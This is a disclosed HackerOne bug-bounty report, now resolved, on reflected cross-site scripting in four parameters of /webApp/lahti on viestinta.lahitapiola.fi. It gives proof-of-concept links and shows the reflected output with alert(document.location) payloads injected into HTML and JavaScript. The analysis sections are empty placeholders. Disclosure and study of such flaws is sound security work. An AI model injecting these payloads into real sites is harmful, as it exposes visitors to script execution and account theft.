---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '181842'
original_report_id: '181842'
title: Multiple Reflected XSS /webApp/lahti (viestinta.lahitapiola.fi)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: localtapiola
created_at: '2016-11-12T21:48:17.939Z'
disclosed_at: '2017-02-03T16:05:25.595Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Multiple Reflected XSS /webApp/lahti (viestinta.lahitapiola.fi)

## Metadata

- HackerOne Report ID: 181842
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: localtapiola
- Disclosed At: 2017-02-03T16:05:25.595Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Vulnerable script**: /webApp/lahti
**Vulnerable parameters**: ctx[vars][html], ctx[vars][zoom], ctx[vars][Lat], ctx[vars][Lng]

**PoC #1** html parameter
https://blackfan.ru/localtapiola_4567uytr567tre4567ytr/poc1_html.html
Result:
```html
<td id="html-html196-cell" class="html" style="" colspan="1"><script>alert(document.location)</script></td>
```

**PoC #2** zoom parameter
https://blackfan.ru/localtapiola_4567uytr567tre4567ytr/poc2_zoom.html
Result:
```js
function initialize() {
  var myLatlng = new google.maps.LatLng(60.9949226,25.6508941);
  var mapOptions = {
    zoom: alert(document.loction),
```

**PoC #3** Lat parameter
https://blackfan.ru/localtapiola_4567uytr567tre4567ytr/poc3_Lat.html
Result:
```js
function initialize() {
  var myLatlng = new google.maps.LatLng(alert(document.location),25.6508941);
```

**PoC #4** Lng parameter
https://blackfan.ru/localtapiola_4567uytr567tre4567ytr/poc4_Lng.html
Result:
```js
function initialize() {
  var myLatlng = new google.maps.LatLng(60.9949226,alert(document.location));
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
